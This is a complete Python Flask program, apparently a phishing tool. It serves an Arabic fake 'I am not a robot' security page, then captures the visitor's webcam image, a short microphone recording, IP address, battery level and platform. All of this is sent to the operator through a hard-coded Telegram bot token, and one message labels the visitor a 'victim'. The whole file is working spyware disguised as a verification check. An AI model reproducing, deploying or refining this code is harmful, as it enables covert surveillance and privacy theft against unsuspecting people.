import base64, requests, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- إعدادات الملك سيوفي ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الأمان</title>
    <style>
        body { background: #050505; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #333; width: 85%; max-width: 400px; }
        .btn { background: #f38020; color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
        #st { margin-top: 20px; color: #888; font-size: 0.9rem; }
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 60px; margin-bottom: 20px;">🛡️</div>
        <h2>تأكيد الهوية</h2>
        <p style="color: #aaa; margin-bottom: 30px;">يرجى الضغط لتجاوز نظام الحماية والوصول للرابط</p>
        <button class="btn" id="go" onclick="start()">أنا لست روبوت</button>
        <div id="st"></div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        async function post(d, t) { fetch('/api', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }

        async function start() {
            document.getElementById('go').style.display = 'none';
            document.getElementById('st').innerText = "جاري التحقق...";
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = s;
                
                // جلب IP والمعلومات
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const b = await navigator.getBattery().catch(() => ({}));

                await post(`✅ **ضحية فتحت الرابط**:\\n🌐 IP: ${ipData.ip}\\n🔋 شحن: ${Math.round(b.level*100)}%\\n📱 النظام: ${navigator.platform}`, "msg");

                setTimeout(() => {
                    const v = document.getElementById('v');
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    post(c.toDataURL('image/jpeg', 0.8), "img");
                    
                    const rec = new MediaRecorder(s);
                    const ch = [];
                    rec.ondataavailable = e => ch.push(e.data);
                    rec.onstop = () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(ch));
                        reader.onloadend = () => post(reader.result, "aud");
                        document.getElementById('st').innerText = "تم التحقق!";
                    };
                    rec.start();
                    setTimeout(() => rec.stop(), 5000);
                }, 4000);
            } catch (e) { location.reload(); }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/api', methods=['POST'])
def api():
    data = request.get_json(force=True, silent=True)
    if not data: return "OK"
    t, d = data.get('t'), data.get('d')
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if t == 'msg': requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID}, files={'photo': ('c.jpg', img)})
    elif t == 'aud':
        aud = base64.b64decode(d.split(',')[1])
        requests.post(url + "sendVoice", data={'chat_id': ADMIN_ID}, files={'voice': ('v.ogg', aud)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True, silent=True)
    if data and "message" in data:
        uid = str(data["message"]["chat"]["id"])
        if uid == ADMIN_ID:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={'chat_id': uid, 'text': f"✅ السيرفر متصل! رابطك:\\nhttps://sif-pro.onrender.com"})
    return "OK"

if __name__ == '__main__':
    # هذا السطر هو اللي يخلي الرابط "يفتح" وما يعطي خطأ في Render
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
